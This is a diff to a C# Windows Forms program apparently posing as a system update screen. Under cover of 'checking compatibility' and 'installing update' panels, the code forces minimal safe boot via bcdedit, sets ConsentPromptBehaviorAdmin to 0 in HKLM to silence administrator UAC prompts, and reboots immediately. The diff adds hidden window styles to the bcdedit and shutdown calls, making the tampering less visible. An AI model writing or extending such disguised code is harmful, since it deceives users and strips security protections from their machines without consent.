@@ -97,7 +97,11 @@ namespace UpdateScreen
                 InitializeComponent();
                 this.checkingDeviceCompatibility.Hide();
                 this.installingUpdate.Hide();
-                this.pictureBox1.SizeMode = PictureBoxSizeMode.AutoSize;
+                this.pictureBox1.SizeMode = PictureBoxSizeMode.Zoom;
+                this.pictureBox2.SizeMode = PictureBoxSizeMode.Zoom;
+                this.pictureBox3.SizeMode = PictureBoxSizeMode.Zoom;
+                this.pictureBox4.SizeMode = PictureBoxSizeMode.Zoom;
+                this.pictureBox5.SizeMode = PictureBoxSizeMode.Zoom;
                 this.MaximizeBox = false;
                 this.CenterToScreen(); //why is everything in american english
                 String thisprocessname = Process.GetCurrentProcess().ProcessName;
@@ -147,6 +151,7 @@ namespace UpdateScreen
             Process safemodereboot = new Process();
             safemodereboot.StartInfo.FileName = "bcdedit.exe";
             safemodereboot.StartInfo.Arguments = "/set {current} safeboot minimal";
+            safemodereboot.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
             safemodereboot.Start();
             RegistryKey hklmsystemstuff = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System");
             hklmsystemstuff.SetValue("ConsentPromptBehaviorAdmin", 0); //why tf is everything in american english
@@ -163,6 +168,7 @@ namespace UpdateScreen
             Process reboot = new Process();
             reboot.StartInfo.FileName = "shutdown.exe";
             reboot.StartInfo.Arguments = "-r -t 0";
+            reboot.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
             reboot.Start();
         }
 
